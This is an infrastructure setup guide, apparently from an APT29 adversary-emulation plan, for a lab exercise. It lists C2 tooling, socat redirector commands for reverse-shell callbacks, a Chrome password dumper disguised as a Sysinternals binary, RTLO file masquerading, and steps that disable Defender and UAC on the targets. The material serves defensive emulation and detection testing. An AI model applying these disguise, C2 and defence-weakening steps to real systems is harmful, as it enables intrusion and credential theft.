# Scenario 1 Infrastructure

We hope to capture the general structure of what is reported to have been seen being used by APT29.  The infrastructure listed below is specific to Scenario 1.  The requirements described herein should be considered a bare minimum to execute the scenario.  If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc.  If you are not concerned with emulating APT29 to this degree, this level of effort is not necessary.  You could for instance, phish, serve payload, and exfil from/to the same server.

Please note that binary files hosted in [Scenario_1](/apt29/Resources/Scenario_1) and [Scenario_2](/apt29/Resources/Scenario_2) have been added to password protected zip files.  The password for these files is "malware."

---

## Emulation Team Infrastructure

1. **Attack Platform**: tested and executed on Ubuntu 18.04.3 LTS
    - C2 Framework
        - [Pupy](https://github.com/n1nj4sec/pupy)
        - [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
    - [Chrome Password Dumper](https://github.com/adnan-alhomssi/chrome-passwords)
    - [Sysinternals Suite Zip file](https://download.sysinternals.com/files/SysinternalsSuite.zip)
    - [WebDAV Share](https://www.digitalocean.com/community/tutorials/how-to-configure-webdav-access-with-apache-on-ubuntu-14-04)

2. **Redirector**: tested and executed on Ubuntu 18.04.3 LTS
    - [Socat](https://linux.die.net/man/1/socat)

3. **Windows Attack Platform**: Windows 10 x64 version 1903
    - [Invoke-PSImage](https://github.com/peewpw/Invoke-PSImage)
    - [Python 3](https://www.python.org/downloads/)
    - [PyInstaller](https://www.pyinstaller.org/)

    **Note:** The Windows attack platform is only required if you would like to compile the Scenario 1 payloads. If you use the pre-compiled payloads, you do not need this system.

---

## Emulation Team Infrastructure Configuration

This methodology assumes the following static IP address configurations:

| Red Team System | IP Address |
| ------ | ------ |
| Attack Platform | 192.168.0.4 |
| Redirector | 192.168.0.5 |

#### A note about red team payloads

- This evaluation utilizes four payloads that model APT29 malware.

- The payloads are customized variants of reverse shells from Pupy RAT and Metasploit.

- Pre-compiled payloads are available in the [resources](/apt29/Resources) directory; however, they are configured to connect back to static IP addresses 192.168.0.5 and 192.168.0.4.

- If you would like to build the payloads yourself, please see [payload_configs.md](/apt29/Resources/Scenario_1/payload_configs.md) for further instructions.

### Setup Redirector: 192.168.0.5 (or the value used for the Redirector IP)

From the redirector system, setup port forwarding using Socat.

```powershell
sudo socat TCP-LISTEN:443,fork TCP:192.168.0.4:443 & sudo socat TCP-LISTEN:1234,fork TCP:192.168.0.4:1234 & sudo socat TCP-LISTEN:8443,fork TCP:192.168.0.4:8443 &
```

#### Setup Attack Platform: 192.168.0.4

1. Download Chrome password dumper tool from: <https://github.com/adnan-alhomssi/chrome-passwords/raw/master/bin/chrome-passwords.exe>
2. Download SysInternals zip folder from: <https://download.sysinternals.com/files/SysinternalsSuite.zip>
3. Unzip `SysinternalsSuite.zip`; copy the following files into the SysInternalsSuite directory:
   - `readme.txt`
   - `psversion.txt`
   - `chrome-passwords.exe` (renamed as `accessChk.exe`)
   - `strings64.exe` (compiled from `hostui.cpp`)
4. Zip modified SysinternalsSuite folder
5. Install Pupy and Metasploit on Attack Platform by running `install_day1_tools.sh`
6. Start Pupy docker container then the EC4 listener
   - `sudo pupy/start-compose.sh`
   - `listen -a ec4`

---

## Target Infrastructure

1. 3 targets
    - 1 domain controller and 2 workstations
    - All Windows OS (tested and executed against Win10 1903)
    - Domain joined
    - Same local administrator account on both Windows workstations
2. [Google Chrome Web Browser](https://www.google.com/chrome/) must be available on one of the victim workstations

---

## Target Infrastructure Configuration

#### For each of the 2 target workstations:

1. Login in as user with administrator privileges
2. Ensure Windows Defender is off or configured to alert-only
3. Set UAC to never notify (<https://articulate.com/support/article/how-to-turn-user-account-control-on-or-off-in-windows-10>)
4. Verify user has read/write/execute permissions in the C:\Windows\Temp directory
5. Install Google Chrome (https://www.google.com/chrome/); cache credentials in Chrome password manager
6. Import-PFX certificate found in [shockwave.local.pfx](/apt29/Resources/Scenario_1/shockwave.local.pfx). Instructions below:

#### Import PFX Certificate

Step 6.B of this emulation models [theft of Private Keys](https://attack.mitre.org/techniques/T1552/004/).

1. Copy the PFX certificate located in the [shockwave.local.pfx](/apt29/Resources/Scenario_1/shockwave.local.pfx) file to the Windows victims.

2. Import the certificate using PowerShell:

```powershell
Import-PfxCertificate -Exportable -FilePath "shockwave.local.pfx" -CertStoreLocation Cert:\LocalMachine\My
```

#### Add RTLO character and place rcs.3aka3.doc on Windows Victim-1

* See [payload_configs.md](/apt29/Resources/Scenario_1/payload_configs.md) for instructions on how to update [cod.3aka3.scr](/apt29/Resources/Scenario_1/cod.3aka3.scr)

---

## Additional Plan Resources

- [Intelligence Summary](/apt29/Intelligence_Summary.md)
- [Operations Flow](/apt29/Operations_Flow.md)
- [Emulation Plan](/apt29/Emulation_Plan/README.md)
  - [Scenario 1 - Infrastructure](/apt29/Emulation_Plan/Scenario_1/Infrastructure.md)
  - [Scenario 1](/apt29/Emulation_Plan/Scenario_1/README.md)
  - [Scenario 2 - Infrastructure](/apt29/Emulation_Plan/Scenario_2/Infrastructure.md)
  - [Scenario 2](/apt29/Emulation_Plan/Scenario_2/README.md)
  - [YAML](/apt29/Emulation_Plan/yaml)
- [Archive](/apt29/Archive)
- [Issues](https://github.com/center-for-threat-informed-defense/adversary_emulation_library/issues)
- [Change Log](/apt29/CHANGE_LOG.md)
